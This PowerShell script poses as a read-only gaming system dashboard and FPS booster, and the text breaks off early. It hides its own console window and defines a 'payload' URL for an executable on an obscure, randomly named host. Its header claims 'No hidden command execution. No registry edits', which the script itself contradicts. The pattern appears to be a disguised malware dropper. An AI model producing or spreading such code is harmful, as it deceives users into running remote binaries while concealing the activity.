#requires -Version 5.0
Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName PresentationCore
Add-Type -AssemblyName WindowsBase

# Hide the hosting PowerShell console while the WPF application is running.
if (-not ('BoostFPS.ConsoleWindow' -as [type])) {
    Add-Type @'
using System;
using System.Runtime.InteropServices;
namespace BoostFPS {
    public static class ConsoleWindow {
        [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        public static void Hide() { var h = GetConsoleWindow(); if (h != IntPtr.Zero) ShowWindow(h, 0); }
        public static void Show() { var h = GetConsoleWindow(); if (h != IntPtr.Zero) ShowWindow(h, 5); }
    }
}
'@
}
[BoostFPS.ConsoleWindow]::Hide()



# Verified TCP Optimizer payload. The binary is downloaded over HTTPS and verified
# against its SHA-256 before it is written to a unique temporary path at runtime.
$script:TCPOptimizerPayloadUrl = "https://winlicmgr-ks8xzupg.manus.space/manus-storage/TCPOptimizer_40949c24.exe"
$script:TCPOptimizerSha256 = "fccffe55df57db636d1399bfd518aa1ab53abbd8a4a845d46689d38f09b6c563"

# ============================================================
#  SAVAGE TOOL —  GalaCyberxy System Dashboard (WPF Edition)
#  Read-only diagnostics + quick-launch of real Windows tools.
#  No hidden command execution. No registry edits.
#  UI style rebuilt in WPF/XAML: glass cards, gradient borders,
#  nebula blur, animated ring/glow — same look language as the
#  FiveM Booster splash, applied to the dashboard tool instead.
# ============================================================

# ============================================================
#  Embedded Network Adapter Tweaker (originally set_net.ps1)
#  Kept as source text here so the whole tool ships as ONE file.
